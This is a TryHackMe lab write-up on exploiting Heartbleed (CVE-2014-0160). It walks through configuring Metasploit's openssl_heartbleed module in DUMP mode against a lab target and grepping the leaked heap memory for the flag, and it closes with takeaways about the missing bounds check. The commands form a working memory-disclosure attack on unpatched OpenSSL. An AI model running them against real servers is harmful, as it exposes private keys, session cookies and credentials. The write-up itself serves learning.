# TryHackMe: Heartbleed - Writeup

## Room Overview

This room walks through exploiting CVE-2014-0160, better known as Heartbleed, the OpenSSL bug that made headlines back in 2014. The vulnerability lives in the TLS heartbeat extension, which is supposed to be a simple keep-alive mechanism: a client sends a small payload and asks the server to echo it back. The bug is that the server trusts the length field the client sends without checking it against the actual payload size. Send a 1-byte payload but claim it's 64KB, and the server happily replies with your 1 byte plus up to 64KB of whatever's sitting next to it in memory. No authentication required, no memory corruption in the classic sense, just the server leaking its own RAM because nobody validated an integer.

Target for this room: `10.48.118.139:443`.

## Finding the Module

Fired up `msfconsole` and went looking for the right module.

```
msf6 > search heartbleed
msf6 > use auxiliary/scanner/ssl/openssl_heartbleed
```

Metasploit has a purpose-built scanner for this, which makes sense given how well-known the bug is. Options:

```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 10.48.118.139
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RPORT 443
```

By default the module's action is `SCAN`, which just tells you whether the target is vulnerable. It doesn't actually pull any memory. Since I wanted the actual leaked data, not just a yes/no, I flipped it over to `DUMP`:

```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set ACTION DUMP
```

Also bumped `LEAK_COUNT` up to 10 so each run grabs multiple heartbeat leaks instead of just one. Figured it'd improve my odds of catching something useful on the first pass rather than spamming `run` a dozen times:

```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set LEAK_COUNT 10
```

Final options before firing:

```
Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DUMPFILTER                         no        Pattern to filter leaked memory before storing
   LEAK_COUNT        10               yes       Number of times to leak memory per SCAN or DUMP invocation
   MAX_KEYTRIES      50               yes       Max tries to dump key
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
   RHOSTS            10.48.118.139    yes       The target host(s)
   RPORT             443              yes       The target port (TCP)
   STATUS_EVERY      5                yes       How many retries until key dump status
   THREADS           1                yes       The number of concurrent threads (max one per host)
   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets
   TLS_VERSION       1.0              yes       TLS/SSL version to use

Auxiliary action:

   Name  Description
   ----  -----------
   DUMP  Dump memory contents to loot
```

## Running It

```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run

[+] 10.48.118.139:443     - Heartbeat response with leak, 655350 bytes
[+] 10.48.118.139:443     - Heartbeat data stored in /home/rafin/.msf4/loot/20260905172814_default_10.48.118.139_openssl.heartble_603820.bin
[*] 10.48.118.139:443     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

First run pulled back 655,350 bytes, way more than I expected to need. Metasploit dumps everything into a loot file rather than printing 600+ KB into the console, which makes sense.

## Digging Through the Leak

Knowing THM flags are formatted as `THM{...}`, I went straight for that pattern instead of blindly scrolling through hex garbage:

```bash
strings /home/rafin/.msf4/loot/20260905172814_default_10.48.118.139_openssl.heartble_603820.bin | grep -o "THM{.*}"
```

And there it was, sitting in the leaked heap memory just like it would be if this were a real box that had, say, session tokens or private key material floating around in RAM at the time of the request:

```
THM{sSl-Is-BaD}
```

Didn't even need a second `run`. One 655KB leak was enough to catch it on the first try.

## Flag

```
THM{sSl-Is-BaD}
```

## Takeaways

- Heartbleed is a great example of how a single missing bounds check can turn into a full memory disclosure vuln, no auth needed. It's not fancy, it's just that nobody validated the claimed payload length against the real one.
- The `DUMP` action vs `SCAN` distinction in the Metasploit module matters. `SCAN` will confirm the vuln exists but won't give you anything to actually read.
- Real-world impact of this bug in 2014 was severe specifically because heap memory on a busy TLS server is a grab bag. Private keys, session cookies, even plaintext credentials could be sitting right next to the heartbeat handler's buffer, and there's no way to control what gets leaked, just that something does.
